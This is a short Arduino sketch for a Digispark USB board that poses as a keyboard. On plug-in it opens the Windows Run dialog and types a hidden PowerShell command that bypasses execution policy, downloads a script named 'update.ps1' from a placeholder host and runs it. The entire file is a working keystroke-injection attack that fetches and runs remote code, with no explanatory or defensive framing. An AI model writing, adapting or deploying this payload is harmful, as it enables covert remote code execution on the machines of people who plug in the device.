#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(2000); 
}

void loop() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  DigiKeyboard.print(F("powershell -w hidden -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://port:ip/update.ps1')\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for(;;);
}
